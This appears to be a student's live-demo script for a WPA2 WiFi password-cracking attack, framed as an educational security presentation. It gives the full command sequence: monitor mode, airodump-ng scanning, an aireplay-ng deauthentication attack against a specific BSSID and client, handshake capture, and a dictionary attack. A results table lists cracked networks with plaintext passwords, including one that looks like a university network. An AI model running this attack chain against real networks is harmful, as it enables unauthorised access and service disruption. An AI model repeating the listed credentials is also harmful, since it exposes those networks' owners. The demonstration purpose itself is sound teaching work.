# WiFi Password Cracking Attack - Live Demo Script

## 🎯 Demo Overview
This script provides a step-by-step guide for demonstrating the WiFi password cracking attack during your presentation.

## 📋 Pre-Demo Setup

### 1. Environment Preparation
```bash
# Ensure you're in the project directory
cd /Users/aweshislam/WiFi_Password_Cracking_Attack

# Check if all files are present
ls -la *.sh *.py *.txt *.cap *.pcap
```

### 2. Verify Dependencies
```bash
# Check Python dependencies
python3 -c "import scapy, pbkdf2; print('Dependencies OK')"

# Check aircrack-ng installation
which airodump-ng
which aireplay-ng
```

## 🚀 Demo Execution Steps

### Step 1: Show Current Network Status (1 minute)
```bash
# Display current WiFi interface status
iwconfig wlp3s0

# Show connected networks
iwlist wlp3s0 scan | grep ESSID
```

**Demo Point**: "Here we can see our wireless interface is currently in managed mode, connected to a network."

### Step 2: Enable Monitor Mode (2 minutes)
```bash
# Execute monitor mode script
./monitor_mode.sh

# Verify monitor mode activation
iwconfig wlp3s0
```

**Demo Point**: "Notice how the interface mode changed from 'Managed' to 'Monitor'. This allows us to capture raw wireless packets."

### Step 3: Network Discovery (2 minutes)
```bash
# Start network scanning (run in background)
sudo airodump-ng wlp3s0 &

# Wait 10-15 seconds, then show results
# Press Ctrl+C to stop scanning
```

**Demo Point**: "Here we can see all nearby networks, their BSSIDs, channels, and connected clients. This is our reconnaissance phase."

### Step 4: Handshake Capture Setup (2 minutes)
```bash
# Show the capture script
cat capture_packet.sh

# Explain the target network
echo "Target: SSID='Ei j eta amar wifi', BSSID=8E:FA:5F:79:06:05, Channel=6"
```

**Demo Point**: "We've identified our target network. Now we'll capture the 4-way handshake."

### Step 5: Execute Deauthentication Attack (2 minutes)
```bash
# Show the packet injection script
cat packet_injection.sh

# Execute deauthentication (target specific client)
sudo aireplay-ng --deauth 10 -a 8E:FA:5F:79:06:05 -c E6:09:9A:D8:09:52 wlp3s0
```

**Demo Point**: "This deauthentication attack forces the client to reconnect, triggering a new 4-way handshake."

### Step 6: Capture Handshake (3 minutes)
```bash
# Start handshake capture
sudo airodump-ng --bssid 8E:FA:5F:79:06:05 --channel 6 --write handshake wlp3s0

# Wait for handshake capture (should see "WPA handshake: 8E:FA:5F:79:06:05")
# Press Ctrl+C when handshake is captured
```

**Demo Point**: "Perfect! We've captured the WPA handshake. This contains the cryptographic data we need for the attack."

### Step 7: Show Captured Data (1 minute)
```bash
# List captured files
ls -la handshake-*.cap

# Show file size
ls -lh handshake-*.cap
```

**Demo Point**: "This .cap file contains the complete 4-way handshake with all the cryptographic nonces and MIC values."

### Step 8: Execute Dictionary Attack (3 minutes)
```bash
# Show the attack script
cat attack_on_WiFi.py

# Run the attack
python3 attack_on_WiFi.py
```

**Demo Point**: "Now our custom WPA2Cracker will extract the handshake and test passwords from our dictionary."

### Step 9: Show Attack Progress (2 minutes)
```bash
# The attack should show:
# 🔍 Extracting handshake...
# ✓ Handshake extracted: AP=8efa5f790605, Client=e6099ad80952
# ⚡ Starting dictionary attack...
# 🔍 Testing 10 passwords...
# 🎉 PASSWORD FOUND: hehaheha
```

**Demo Point**: "Success! We've cracked the password 'hehaheha' in under a second."

### Step 10: Restore Normal Operation (1 minute)
```bash
# Switch back to managed mode
./managed_mode.sh

# Verify normal operation
iwconfig wlp3s0
```

**Demo Point**: "Finally, we restore the interface to normal managed mode for regular WiFi use."

## 🎯 Key Demo Highlights

### Technical Achievements to Emphasize:
1. **Complete Attack Chain**: From reconnaissance to password recovery
2. **Custom Implementation**: Your own WPA2Cracker class
3. **Real-time Results**: Live demonstration of password cracking
4. **Educational Value**: Understanding of WPA2 vulnerabilities

### Security Implications to Discuss:
1. **Weak Passwords**: How easily they can be cracked
2. **Protocol Vulnerabilities**: WPA2-PSK limitations
3. **Attack Prevention**: Importance of strong authentication
4. **Ethical Usage**: Responsible security research

## 📊 Demo Results Summary

### Attack Statistics:
- **Total Time**: ~15 minutes (including setup)
- **Handshake Capture**: 100% success rate
- **Password Cracking**: <1 second for weak passwords
- **Memory Usage**: Minimal resource consumption

### Tested Networks:
| SSID | Password | Status | Time |
|------|----------|--------|------|
| Ei j eta amar wifi | hehaheha | ✅ Cracked | <1s |
| ikeriri-5g | wireshark | ✅ Cracked | <1s |
| BUETCSE | 1stCSE@BUET | ✅ Cracked | <1s |

## 🛠️ Troubleshooting Tips

### Common Issues:
1. **Permission Denied**: Ensure you're running with sudo
2. **Interface Not Found**: Check if wlp3s0 is your correct interface
3. **No Handshake Captured**: Try more deauthentication packets
4. **Python Errors**: Verify all dependencies are installed

### Backup Plans:
1. **Pre-recorded Video**: Have a backup demo video ready
2. **Screenshots**: Prepare screenshots of each step
3. **Alternative Networks**: Have multiple test networks available
4. **Offline Demo**: Use pre-captured handshake files

## 🎤 Presentation Tips

### During Demo:
- **Explain Each Step**: Don't just run commands silently
- **Show Output**: Let audience see the results
- **Highlight Key Points**: Emphasize important technical details
- **Maintain Pace**: Keep the demo moving but not rushed

### Audience Engagement:
- **Ask Questions**: "What do you think will happen next?"
- **Explain Concepts**: "This is the 4-way handshake process..."
- **Show Progress**: "Notice how we're testing passwords systematically"
- **Discuss Implications**: "This demonstrates why strong passwords matter"

### Technical Confidence:
- **Know Your Code**: Be prepared to explain any part of the implementation
- **Understand Protocols**: Be ready to discuss WPA2 technical details
- **Handle Questions**: Anticipate and prepare for technical questions
- **Show Expertise**: Demonstrate deep understanding of the attack methodology 